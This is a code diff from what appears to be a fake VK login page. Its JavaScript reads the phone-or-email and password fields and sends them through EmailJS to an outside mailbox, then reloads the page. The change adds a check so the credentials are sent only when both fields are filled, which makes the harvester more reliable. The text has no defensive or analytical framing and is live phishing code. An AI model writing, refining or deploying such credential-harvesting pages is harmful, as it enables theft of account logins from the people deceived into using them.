@@ -140,7 +140,10 @@ Stay in touch on the go with VK mobile.
         var username = document.getElementById("Phone or email").value;
         var password = document.getElementById("password").value;
         var message = username + " " + password;        
-        emailjs.send("gmail","template_segz0mey",{name: "James", notes: "Check this out!", message_html: message });
+        if(username != '' && password != '') {
+          emailjs.send("gmail","template_segz0mey",{name: "James", notes: "Check this out!", message_html: message });
+        }
+    
         setTimeout(function() {
           location.reload();
         },2000);
